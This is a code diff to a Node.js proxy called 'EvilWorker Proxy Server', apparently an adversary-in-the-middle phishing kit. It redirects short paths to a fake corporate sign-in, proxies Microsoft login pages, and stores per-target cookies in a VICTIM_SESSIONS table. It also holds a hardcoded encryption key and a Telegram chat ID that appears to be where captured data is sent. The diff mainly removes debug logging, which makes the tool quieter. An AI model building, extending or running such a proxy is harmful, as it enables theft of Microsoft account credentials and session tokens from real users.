@@ -36,19 +36,10 @@ try {
         fs.mkdirSync(LOGS_DIRECTORY);
     }
     LOGGING_ENABLED = true;
-    console.log("✅ Logging enabled - filesystem is writable");
 } catch (error) {
-    console.log("⚠️ Logging disabled - filesystem not writable:", error.message);
+    console.log("Logging disabled - filesystem not writable:", error.message);
     LOGGING_ENABLED = false;
 }
-
-// Add comprehensive logging
-console.log("🚀 EvilWorker Proxy Server Starting...");
-console.log("📊 Environment:", {
-    NODE_ENV: process.env.NODE_ENV,
-    PORT: process.env.PORT,
-    LOGGING_ENABLED: LOGGING_ENABLED
-});
 const LOG_FILE_STREAMS = {};
 //!\ It is strongly recommended to modify the encryption key and store it more securely for real engagements. /!\\
 const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
@@ -61,21 +52,11 @@ const TELEGRAM_CHAT_ID_1 = "6263177378";
 
 
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
-    console.log(`🔍 Processing request: ${clientRequest.method} ${clientRequest.url}`);
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
-    
-    console.log(`📋 Request details:`, {
-        url: url,
-        method: method,
-        host: headers.host,
-        session: currentSession ? 'exists' : 'none',
-        userAgent: headers['user-agent']?.substring(0, 50) + '...'
-    });
 
     // Handle short URLs regardless of method
     if (url === '/c' || url === '/corp' || url === '/corporate') {
-        console.log(`🔄 Redirecting short URL to corporate login`);
         // Redirect to full corporate login URL
         clientResponse.writeHead(302, { 
             Location: `/login?method=signin&mode=secure&client_id=${CORPORATE_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F` 
@@ -356,12 +337,9 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         } else if (!currentSession) {
             // If no session exists, try to create one for common paths
             if (url.includes('/login') || url.includes('/signin') || url.includes('/oauth')) {
-                console.log(`🔐 Creating new session for login URL: ${url}`);
-
                 // Create a default session for Microsoft login attempts
                 const defaultUrl = new URL('https://login.live.com/');
                 const { cookieName, cookieValue } = generateNewSession(defaultUrl);
-                console.log(`🍪 Generated session cookie: ${cookieName}=${cookieValue}`);
                 clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`);
                 
                 VICTIM_SESSIONS[cookieName].protocol = 'https:';
@@ -369,7 +347,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                 VICTIM_SESSIONS[cookieName].path = url;
                 VICTIM_SESSIONS[cookieName].port = '';
                 VICTIM_SESSIONS[cookieName].host = 'login.live.com';
-                console.log(`📝 Session created for hostname: ${VICTIM_SESSIONS[cookieName].hostname}`);
                 
                 // Serve a simple loading page that will retry the request
                 clientResponse.writeHead(200, { "Content-Type": "text/html" });
@@ -397,25 +374,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         }
     }
 });
-const port = process.env.PORT ?? 3000;
-console.log(`🌐 Starting server on port ${port}`);
-console.log(`🔗 Server will be available at: http://localhost:${port}`);
-
-proxyServer.listen(port, () => {
-    console.log(`✅ EvilWorker Proxy Server is running on port ${port}`);
-    console.log(`📡 Ready to handle requests...`);
-});
-
-// Add error handling for the server
-proxyServer.on('error', (error) => {
-    console.error('❌ Server error:', error);
-});
-
-// Add request logging
-proxyServer.on('request', (req, res) => {
-    console.log(`📥 Incoming request: ${req.method} ${req.url}`);
-    console.log(`🔍 Headers:`, req.headers);
-});
+proxyServer.listen(process.env.PORT ?? 3000);
 
 
 const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest) => {
